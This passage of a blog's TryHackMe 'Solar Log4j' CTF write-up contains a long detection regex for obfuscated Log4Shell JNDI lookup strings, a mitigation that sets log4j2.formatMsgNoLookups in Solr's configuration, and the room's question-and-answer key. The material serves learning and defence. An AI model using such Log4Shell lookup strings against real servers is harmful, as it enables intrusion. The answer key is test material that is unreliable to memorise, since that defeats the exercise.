164))){2}[^\n]*?(?:p|%(?:25%?)*(?:50|70)|\\u?0*(?:70|50|160|120))(?:[^\n]*?(?:[s\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\u?0*(?:17f|123|577|73|53|163)))?)[^\n]*?(?:[\x3a]|%(?:25%?)*3a|\\u?0*(?:72|3a))|(?:b|%(?:25%?)*(?:42|62)|\\u?0*(?:102|62|42|142))[^\n]*?(?:a|%(?:25%?)*(?:41|61)|\\u?0*(?:101|61|41|141))[^\n]*?(?:[s\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\u?0*(?:17f|123|577|73|53|163))[^\n]*?(?:e|%(?:25%?)*(?:45|65)|\\u?0*(?:45|145|105|65))[^\n]*?(?:[\x3a]|%(?:25%?)*3a|\\u?0*(?:72|3a))(JH[s-v]|[\x2b\x2f-9A-Za-z][CSiy]R7|[\x2b\x2f-9A-Za-z]{2}[048AEIMQUYcgkosw]ke[\x2b\x2f-9w-z]))
</code></pre><h2 id=bypasses>Bypasses<a hidden class=anchor aria-hidden=true href=#bypasses>#</a></h2>
<p>Here&rsquo;s a bunch of bypasses for real life scenarios.
<img loading=lazy src=/img/solarlog4j/bypass.png alt>
</p>
<p>You can also search for more exhaustive lists on Github.</p>
<h2 id=mitigation>Mitigation<a hidden class=anchor aria-hidden=true href=#mitigation>#</a></h2>
<p>Let&rsquo;s patch the machine by changing its configuration.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>solr@solar:/var/solr/logs$ find / -type f -name <span style=color:#e6db74>&#34;solr.in.sh&#34;</span> 2&gt;/dev/null
/etc/default/solr.in.sh
</code></pre></div><p>We just need to add this line to the <code>/etc/default/solr.in.sh</code> file:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>SOLR_OPTS<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span>$SOLR_OPTS<span style=color:#e6db74> -Dlog4j2.formatMsgNoLookups=true&#34;</span>
</code></pre></div><p>Then restart the service. Sending the exact same payload, we can see it doesn&rsquo;t work anymore.</p>
<p><img loading=lazy src=/img/solarlog4j/patched.png#center alt>
</p>
<h2 id=answers>Answers<a hidden class=anchor aria-hidden=true href=#answers>#</a></h2>
<pre tabindex=0><code>What service is running on port 8983? (Just the name of the software)
</code></pre><p>Apache Solr</p>
<pre tabindex=0><code>Take a close look at the first page visible when navigating to http://MACHINE_IP:8983. You should be able to see clear indicators that log4j is in use within the application for logging activity. What is the -Dsolr.log.dir argument set to, displayed on the front page?
</code></pre><p>/var/solr/logs</p>
<pre tabindex=0><code>One file has a significant number of INFO entries showing repeated requests to one specific URL endpoint. Which file includes contains this repeated entry? (Just the filename itself, no path needed)
</code></pre><p>solr.log</p>
<pre tabindex=0><code>What &quot;path&quot; or URL endpoint is indicated in these repeated entries?
</code></pre><p>/admin/cores</p>
<pre tabindex=0><code>Viewing these log entries, what field name indicates some data entrypoint that you as a user could control? (Just the field name)
</code></pre><p>params</p>
<pre tabindex=0><code>What is the output of running this command? (You should leave this terminal window open as it will be actively awaiting connections)
</code></pre><p>Listening on 0.0.0.0:1389</p>
<pre tabindex=0><code>What user are you?
</code></pre><p>solr</p>
<pre tabindex=0><code>What is the full path of the specific solr.in.sh file?
</code></pre><p>/etc/default/solr.in.sh</p>
<h2 id=final-words>Final words<a hidden class=anchor aria-hidden=true href=#final-words>#</a></h2>
<p>And that&rsquo;s an overview about the severe vulnerability that &ldquo;affect almost all software under the sun&rdquo;.</p>
<p>&mldr; Why are you still here? It&rsquo;s high time patching your servers, isn&rsquo;t it? <code>&lt;(Ôø£Ô∏∂Ôø£)></code></p>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=https://git-akihakune.github.io/tags/cve/>cve</a></li>
<li><a href=https://git-akihakune.github.io/tags/ctf/>ctf</a></li>
<li><a href=https://git-akihakune.github.io/tags/thm/>thm</a></li>
<li><a href=https://git-akihakune.github.io/tags/english/>english</a></li>
</ul>
<nav class=paginav>
<a class=next href=https://git-akihakune.github.io/blog/adventofcyber3-2/>
<span class=title>Next Page ¬ª</span>
<br>
<span>Try Hack Me - Advent Of Cyber 3 writeup (Part 2)</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Solar Log4j on twitter" href="https://twitter.com/intent/tweet/?text=Try%20Hack%20Me%20-%20Solar%20Log4j&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fsolarlog4j%2f&hashtags=cve%2cctf%2cthm%2cenglish"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Solar Log4j on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fsolarlog4j%2f&title=Try%20Hack%20Me%20-%20Solar%20Log4j&summary=Try%20Hack%20Me%20-%20Solar%20Log4j&source=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fsolarlog4j%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Solar Log4j on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fsolarlog4j%2f&title=Try%20Hack%20Me%20-%20Solar%20Log4j"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Solar Log4j on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fsolarlog4j%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Solar Log4j on whatsapp" href="https://api.whatsapp.com/send?text=Try%20Hack%20Me%20-%20Solar%20Log4j%20-%20https%3a%2f%2fgit-akihakune.github.io%2fblog%2fsolarlog4j%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Solar Log4j on telegram" href="https://telegram.me/share/url?text=Try%20Hack%20Me%20-%20Solar%20Log4j&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fsolarlog4j%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer><script src=https://utteranc.es/client.js repo=git-akihakune/git-akihakune.github.io issue-term=pathname theme=photon-dark crossorigin=anonymous async></script>
</article>
</main>
<footer class=footer>
<span>&copy; 2022 <a href=https://git-akihakune.github.io>Hakune Blog</a></span>
- Aki Hakune
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>